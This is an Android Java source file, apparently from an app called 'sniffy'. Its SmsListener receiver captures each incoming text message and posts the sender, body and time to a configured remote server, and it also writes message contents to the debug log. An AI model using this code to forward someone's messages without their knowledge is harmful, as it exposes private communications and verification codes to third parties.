package com.app.sniffy;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;

import org.apache.http.client.ClientProtocolException;
import org.json.JSONObject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsListener extends BroadcastReceiver {
	
	protected static Queue<JSONObject> incomingQueue;

	@Override
	public void onReceive(Context context, Intent intent) {
		 if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
	            Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
	            SmsMessage[] msgs = null;
	            String msg_from = "";
	            String msgBody = "";
	            if (bundle != null){
	                //---retrieve the SMS message received---
	                try{
	                    Object[] pdus = (Object[]) bundle.get("pdus");
	                    msgs = new SmsMessage[pdus.length];
	                    for(int i=0; i<msgs.length; i++){
	                        msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
	                        msg_from = msgs[i].getOriginatingAddress();
	                        msgBody = msgs[i].getMessageBody();
	                        
	                        SharedPreferences settings = context.getSharedPreferences(MainActivity.PREFS_NAME, 0);
	                        String key = settings.getString("key", null);
	                        
	                        JSONObject messageJson = new JSONObject();
	                        messageJson.put("key", key);
	                        messageJson.put("remoteNumber", msg_from);
	                        messageJson.put("phoneTime", (new Date().getTime()));
	                        messageJson.put("textMessage", msgBody);
	                        messageJson.put("outgoing", false);
	                        
	                        try {
	            				new sendIncoming(messageJson).execute(new URI(Utils.getConfigProperty(context.getResources(), "sendIncoming")));
	            			} catch (URISyntaxException e1) {
	            				Log.d("sms listner URISyntaxException", e1.toString());
	            			}
	                        
	                    }
	                    
	                }catch(Exception e){
	                    Log.d("sms listner Exception caught",e.getMessage());
	                }
	            }
	        }
	}
	
	protected class sendIncoming extends AsyncTask<URI, Void, String> {

		JSONObject message;
		
		public sendIncoming(JSONObject message){
			this.message = message;
		}

		@Override
		protected String doInBackground(URI... url) {
			int count = url.length;
			String result = "";
			for (int i = 0; i < count; i++) {
				try {
					Log.d("in coming message", message.toString());
					result = APICall.makePostConnection(url[i],message);
				} catch (ClientProtocolException e) {
					Log.d("sms listner ClientProtocolException", e.toString());
				} catch (IOException e) {
					Log.d("sms listner IOException", e.toString());
					if(incomingQueue == null)
						incomingQueue = new LinkedList<JSONObject>();
					
					incomingQueue.offer(message);
				}
			}
			return result;
		}

		@Override
		protected void onPostExecute(String result) {
			
		}
	}


}
